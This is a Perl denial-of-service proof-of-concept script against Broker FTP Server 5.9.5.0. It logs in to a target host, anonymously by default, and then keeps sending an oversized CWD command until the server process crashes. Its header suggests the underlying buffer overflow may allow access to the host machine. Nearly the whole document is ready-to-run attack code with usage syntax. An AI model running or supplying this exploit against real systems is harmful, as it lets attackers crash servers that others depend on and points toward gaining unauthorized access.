#!/usr/bin/perl 

# Broker FTP Server 5.9.5.0 DoS proof of concept
#
# Syntax : perl brokerdos.pl <host> <port> <loginid> <loginpwd>
# Impact : eventually causes an access violation in the TSFTPSRV process
#          the buffer overflow might be exploitable and be used to gain access
#          to the FTP Server hostcomputer.
#
# by [ByteRage] <byterage@yahoo.com>
# www.byterage.cjb.net (http://elf.box.sk/byterage/)

use IO::Socket;

$loginid = "anonymous";
$loginpwd = "anonymous";

if (!($host = $ARGV[0])) { $host = "127.0.0.1"; } print "Logging on @ $host:"; 
if (!($port = $ARGV[1])) { $port = "21"; } print "$port\n\n"; 
if (!($loginid = $ARGV[2])) { $loginid = "anonymous"; } 
if (!($loginpwd = $ARGV[3])) { $loginpwd = "anonymous"; } 

$SOCK = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) || die "Couldn't create socket !"; $SOCK->autoflush();

# get daemon banner
$reply = "";
sysread($SOCK, $reply, 2000);
print $reply;
# login
syswrite $SOCK, "USER $loginid\015\012";
sysread($SOCK, $reply, 2000);
print $reply;
syswrite $SOCK, "PASS $loginpwd\015\012";
sysread($SOCK, $reply, 2000);
print $reply;
sysread($SOCK, $reply, 2000);
print "$reply\nSending crash [";

if (substr($reply,0,1) == '2') {
  # Login succesful, send CWD's
  $i = 1; while ($i) {
    $i = syswrite $SOCK, "CWD .                                                                             .\015\012";
    print ".";
    sleep(1);
  }
print "]\nSocket write failed... possible cause : Host down :(\n";
}
close($SOCK);
exit();